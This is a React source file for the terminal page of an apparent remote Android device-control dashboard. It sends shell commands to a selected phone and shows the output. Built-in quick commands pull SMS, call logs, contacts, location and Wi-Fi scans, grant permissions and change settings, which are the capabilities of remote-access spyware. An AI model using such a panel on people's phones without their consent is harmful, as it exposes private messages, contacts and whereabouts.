'use client'
import { Suspense } from 'react'
import { useEffect, useState, useRef, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { Send, Trash2, Circle, Loader2, FolderOpen } from 'lucide-react'

interface HistoryEntry {
  id: string
  command: string
  result: string
  timestamp: string
  exitCode?: number
}

// Quick command groups
const QUICK_CMDS_SHELL = [
  'ls -la', 'ls /sdcard', 'pwd', 'df -h', 'free -h',
  'uname -a', 'whoami', 'id', 'env',
]
const QUICK_CMDS_FILE = [
  'touch test.txt', 'mkdir testdir', 'rm test.txt',
  'cat test.txt', 'ls -la /sdcard/Download',
  'cp test.txt test2.txt', 'mv test2.txt moved.txt',
  'find /sdcard -name "*.mp4" -maxdepth 3',
  'ls /sdcard/DCIM', 'ls /sdcard/Download',
]
const QUICK_CMDS_SYS = [
  'wake_screen', 'lock_screen',
  'get_apps', 'get_location', 'ring_device', 'stop_ring',
  'get_sms:20', 'get_calls:20', 'get_contacts:50', 'scan_wifi',
  'get_processes', 'ip addr', 'ping',
]

const KNOWN_PREFIXES = [
  'ls_json:', 'read_b64:', 'read_text:', 'write_b64:', 'write_text:',
  'mkdir:', 'delete:', 'move:', 'file_info:', 'shell:', 'shizuku:',
  'pm_grant:', 'pm_revoke:', 'settings_put:', 'settings_get:',
  'pm_list', 'device_info', 'ping', 'shizuku_status',
  'get_location', 'get_sms', 'get_calls', 'get_contacts', 'get_apps',
  'wake_screen', 'lock_screen', 'ring_device', 'stop_ring', 'scan_wifi', 'get_processes',
]

function normalizeCommand(raw: string) {
  const t = raw.trim()
  return KNOWN_PREFIXES.some(p => t.startsWith(p)) ? t : `shell:${t}`
}

function displayCmd(cmd: string) {
  return cmd.startsWith('shell:') ? cmd.slice(6) : cmd
}

// Strip "[dir:/path]" trailer from shell output (used for prompt tracking)
const DIR_TRAILER_RE = /\n?\[dir:([^\]]*)\]$/

function parseOutput(result: string): { text: string; dir: string | null } {
  const m = result?.match(DIR_TRAILER_RE)
  if (!m) return { text: result ?? '', dir: null }
  return {
    text: result.slice(0, result.length - m[0].length),
    dir: m[1] || null,
  }
}

// Extract the most recent shell working directory from history
function latestDirFromHistory(history: HistoryEntry[]): string | null {
  for (const entry of [...history].reverse()) {
    if (!entry.command.startsWith('shell:')) continue
    const m = entry.result?.match(DIR_TRAILER_RE)
    if (m && m[1]) return m[1]
  }
  return null
}

type QuickTab = 'shell' | 'file' | 'sys'

function TerminalContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()

  const [history, setHistory]       = useState<HistoryEntry[]>([])
  const [input, setInput]           = useState('')
  const [sending, setSending]       = useState(false)
  const [pendingCmd, setPendingCmd] = useState<string | null>(null)
  const [cmdHistory, setCmdHistory] = useState<string[]>([])
  const [histIdx, setHistIdx]       = useState(-1)
  const [currentDir, setCurrentDir] = useState('/sdcard')
  const [quickTab, setQuickTab]     = useState<QuickTab>('shell')
  const [viewH, setViewH]           = useState('100dvh')

  const clearedAtRef  = useRef<number>(0)
  const outputRef     = useRef<HTMLDivElement>(null)
  const inputRef      = useRef<HTMLInputElement>(null)
  const sendingRef    = useRef(false)
  const abortRef      = useRef<AbortController | null>(null)

  // Track visual viewport height so layout shrinks when keyboard opens
  useEffect(() => {
    const vv = window.visualViewport
    if (!vv) return
    const onResize = () => setViewH(`${vv.height}px`)
    vv.addEventListener('resize', onResize)
    onResize()
    return () => vv.removeEventListener('resize', onResize)
  }, [])

  // ── Fetch history ────────────────────────────────────────────────────
  const fetchHistory = useCallback(async () => {
    if (!selectedId) return
    try {
      const res  = await fetch(`/api/device/result?deviceId=${selectedId}`)
      const data = await res.json()
      const all: HistoryEntry[] = data.history ?? []
      const cutoff = clearedAtRef.current
      const filtered = cutoff > 0
        ? all.filter(h => new Date(h.timestamp).getTime() > cutoff)
        : all
      setHistory(filtered)
      // Update current dir from most recent shell command
      const latestDir = latestDirFromHistory(filtered)
      if (latestDir) setCurrentDir(latestDir)
      return filtered
    } catch {}
  }, [selectedId])

  // ── Initial load + background refresh every 5s ───────────────────────
  useEffect(() => {
    fetchHistory()
    const iv = setInterval(fetchHistory, 5000)
    return () => clearInterval(iv)
  }, [fetchHistory])

  // ── Reset dir when device changes ─────────────────────────────────────
  useEffect(() => {
    setCurrentDir('/sdcard')
    setHistory([])
    clearedAtRef.current = 0
  }, [selectedId])

  // ── SSE push ─────────────────────────────────────────────────────────
  useEffect(() => {
    if (!selectedId) return
    const es = new EventSource(`/api/device/stream?deviceId=${selectedId}`)
    es.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data)
        if (msg.type === 'heartbeat' || msg.type === 'result') {
          fetchHistory().then((fresh) => {
            if (sendingRef.current && pendingCmd && fresh) {
              const found = fresh.find(h =>
                h.command === pendingCmd &&
                h.result !== undefined && h.result !== null && h.result !== ''
              )
              if (found) {
                setSending(false)
                setPendingCmd(null)
                sendingRef.current = false
                abortRef.current?.abort()
              }
            }
          })
        }
      } catch {}
    }
    es.onerror = () => {}
    return () => es.close()
  }, [selectedId, fetchHistory, pendingCmd])

  // ── Auto-scroll ──────────────────────────────────────────────────────
  useEffect(() => {
    const el = outputRef.current
    if (el) el.scrollTop = el.scrollHeight
  }, [history, pendingCmd])

  // ── Send command ─────────────────────────────────────────────────────
  const sendCommand = useCallback(async (cmd?: string) => {
    if (!selectedId || sendingRef.current) return
    const raw = (cmd ?? input).trim()
    if (!raw) return
    const command = normalizeCommand(raw)

    sendingRef.current = true
    setSending(true)
    setPendingCmd(command)
    setInput('')
    setHistIdx(-1)

    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command }),
      })
      setCmdHistory(prev => [command, ...prev.slice(0, 49)])

      // Fallback polling — in case SSE doesn't fire
      const abort = new AbortController()
      abortRef.current = abort
      const sentAt = Date.now()

      for (let i = 0; i < 32; i++) {
        if (abort.signal.aborted) break
        await new Promise(r => setTimeout(r, i === 0 ? 600 : 750))
        if (abort.signal.aborted) break
        try {
          const res  = await fetch(`/api/device/result?deviceId=${selectedId}`)
          const data = await res.json()
          const all: HistoryEntry[] = data.history ?? []
          const cutoff = clearedAtRef.current
          const filtered = cutoff > 0
            ? all.filter(h => new Date(h.timestamp).getTime() > cutoff)
            : all

          const found = filtered.find(h =>
            h.command === command &&
            new Date(h.timestamp).getTime() > sentAt - 500 &&
            h.result !== undefined && h.result !== null
          )
          setHistory(filtered)
          // Always try to track dir
          const latestDir = latestDirFromHistory(filtered)
          if (latestDir) setCurrentDir(latestDir)

          if (found) break
        } catch {}
      }
    } finally {
      sendingRef.current = false
      setSending(false)
      setPendingCmd(null)
      abortRef.current = null
      inputRef.current?.focus()
    }
  }, [selectedId, input])

  const clearHistory = () => {
    clearedAtRef.current = Date.now()
    setHistory([])
    setCurrentDir('/sdcard')
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      sendCommand()
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      const ni = Math.min(histIdx + 1, cmdHistory.length - 1)
      setHistIdx(ni)
      setInput(displayCmd(cmdHistory[ni] ?? ''))
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const ni = Math.max(histIdx - 1, -1)
      setHistIdx(ni)
      setInput(ni === -1 ? '' : displayCmd(cmdHistory[ni] ?? ''))
    }
  }

  // Shorten dir for prompt display: /sdcard/Download → ~/Download
  const promptDir = currentDir.startsWith('/sdcard')
    ? '~' + currentDir.slice(7)
    : currentDir

  const quickCmds = quickTab === 'shell' ? QUICK_CMDS_SHELL
    : quickTab === 'file' ? QUICK_CMDS_FILE
    : QUICK_CMDS_SYS

  return (
    <div className="flex" style={{ height: viewH, overflow: 'hidden', transition: 'height 0.1s' }}>
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main
        className="flex-1 flex flex-col min-w-0"
        style={{
          paddingTop: 'env(safe-area-inset-top, 0px)',
          paddingBottom: 'env(safe-area-inset-bottom, 0px)',
          overflow: 'hidden',
        }}
      >
        {/* Mobile top-nav spacer */}
        <div className="h-[56px] shrink-0 md:hidden" />

        <div className="flex flex-col flex-1 min-h-0 px-3 md:px-6 pt-3 pb-2 md:py-5 max-w-5xl mx-auto w-full">

          {/* Header */}
          <div className="flex items-center justify-between mb-3 shrink-0">
            <div>
              <h2 className="text-base md:text-xl font-bold text-white">Terminal</h2>
              <p className="text-android-muted text-xs hidden sm:block">Stateful shell · cd · touch · mv · cp · rm · all commands</p>
            </div>
            <div className="flex items-center gap-2">
              <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${
                connected
                  ? 'text-android-green border-android-green/30 bg-android-green/10'
                  : 'text-android-red border-android-red/30 bg-android-red/10'
              }`}>
                <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
                {connected ? 'Online' : 'Offline'}
              </div>
              <button
                onClick={clearHistory}
                className="flex items-center gap-1.5 px-2.5 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-red hover:border-android-red/50 transition-colors"
              >
                <Trash2 size={12} />
                <span className="hidden sm:inline">Clear</span>
              </button>
            </div>
          </div>

          {/* Quick command tabs */}
          <div className="flex gap-1 mb-2 shrink-0">
            {(['shell', 'file', 'sys'] as QuickTab[]).map(tab => (
              <button
                key={tab}
                onClick={() => setQuickTab(tab)}
                className={`px-3 py-1 text-xs rounded-md font-mono border transition-colors ${
                  quickTab === tab
                    ? 'bg-android-green/20 border-android-green/40 text-android-green'
                    : 'bg-android-surface border-android-border text-android-muted hover:text-white'
                }`}
              >
                {tab === 'shell' ? 'Shell' : tab === 'file' ? 'Files' : 'System'}
              </button>
            ))}
          </div>

          {/* Quick commands */}
          <div className="flex gap-1.5 mb-2.5 overflow-x-auto pb-1 scrollbar-none shrink-0">
            {quickCmds.map(cmd => (
              <button
                key={cmd}
                onClick={() => sendCommand(cmd)}
                disabled={!connected || sending}
                className="shrink-0 px-2.5 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-green hover:border-android-green/50 transition-colors disabled:opacity-40 disabled:cursor-not-allowed font-mono whitespace-nowrap"
              >
                {cmd}
              </button>
            ))}
          </div>

          {/* Output — scrollable */}
          <div
            ref={outputRef}
            className="flex-1 min-h-0 bg-[#0a0c10] border border-android-border rounded-xl p-3 md:p-4 overflow-y-auto"
          >
            {history.length === 0 && !pendingCmd ? (
              <div className="h-full flex items-center justify-center">
                <p className="text-android-muted text-sm text-center">
                  {connected
                    ? 'Type a command or tap a quick button ↑\ncd state persists between commands'
                    : 'Connect a device to start'}
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {/* Newest first */}
                {[...history].reverse().map(entry => {
                  const isShell = entry.command.startsWith('shell:')
                  const { text: outputText, dir: entryDir } = isShell
                    ? parseOutput(entry.result ?? '')
                    : { text: entry.result ?? '', dir: null }
                  const isCdCmd = isShell && displayCmd(entry.command).trim().startsWith('cd ')

                  return (
                    <div key={entry.id}>
                      <div className="flex items-center gap-2 mb-1 flex-wrap">
                        <span className="text-android-green text-xs font-bold select-none">$</span>
                        <span className="text-white text-xs font-semibold break-all">{displayCmd(entry.command)}</span>
                        <span className="text-android-muted text-xs ml-auto shrink-0">
                          {new Date(entry.timestamp).toLocaleTimeString()}
                        </span>
                        {entry.exitCode !== undefined && entry.exitCode !== 0 && (
                          <span className="text-android-red text-[10px]">exit {entry.exitCode}</span>
                        )}
                      </div>
                      {/* For cd commands: show the new dir path as result */}
                      {isCdCmd && entryDir ? (
                        <div className="pl-3 border-l border-android-border/50 flex items-center gap-1.5">
                          <FolderOpen size={11} className="text-android-green/70 shrink-0" />
                          <span className="text-android-green/80 text-xs font-mono">
                            {entryDir.startsWith('/sdcard') ? '~' + entryDir.slice(7) : entryDir}
                          </span>
                        </div>
                      ) : outputText ? (
                        <pre className="text-android-text text-xs whitespace-pre-wrap break-all pl-3 border-l border-android-border/50 leading-relaxed">
                          {outputText}
                        </pre>
                      ) : (
                        // Perintah berhasil tanpa output (touch, mkdir, rm, dll) — tampilkan kosong
                        // agar user tidak bingung mengira perintah gagal.
                        <div className="pl-3 border-l border-android-border/20 h-3" />
                      )}
                    </div>
                  )
                })}

                {/* Pending entry */}
                {pendingCmd && (
                  <div className="opacity-60">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-android-green text-xs font-bold select-none">$</span>
                      <span className="text-white text-xs font-semibold break-all">{displayCmd(pendingCmd)}</span>
                      <Loader2 size={11} className="animate-spin text-android-green ml-auto shrink-0" />
                    </div>
                    <pre className="text-android-muted text-xs pl-3 border-l border-android-green/30 italic">
                      waiting…
                    </pre>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Input row with prompt showing current dir */}
          <div className="mt-2 flex gap-2 shrink-0">
            <div className="flex-1 flex items-center bg-[#0a0c10] border border-android-border rounded-xl px-3 py-2.5 gap-2 focus-within:border-android-green/40 transition-colors">
              <span className="text-android-green font-mono text-xs select-none whitespace-nowrap shrink-0">
                {promptDir}&nbsp;$
              </span>
              <input
                ref={inputRef}
                type="text"
                inputMode="text"
                autoCapitalize="none"
                autoCorrect="off"
                spellCheck={false}
                value={input}
                onChange={e => setInput(e.target.value)}
                onKeyDown={handleKeyDown}
                placeholder={connected ? 'Enter command…' : 'No device connected'}
                disabled={!connected}
                className="flex-1 bg-transparent text-android-text font-mono text-sm outline-none placeholder:text-android-muted/40 disabled:opacity-40 min-w-0"
              />
            </div>
            <button
              onClick={() => sendCommand()}
              disabled={!connected || sending || !input.trim()}
              className="w-11 flex items-center justify-center bg-android-green text-android-bg rounded-xl hover:bg-android-green/80 disabled:opacity-40 disabled:cursor-not-allowed transition-all active:scale-95 shrink-0"
            >
              {sending
                ? <Loader2 size={16} className="animate-spin" />
                : <Send size={16} />
              }
            </button>
          </div>

          {/* Mobile bottom-nav spacer */}
          <div className="h-[56px] md:hidden" />
        </div>
      </main>
    </div>
  )
}

export default function TerminalPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <TerminalContent />
    </Suspense>
  )
}
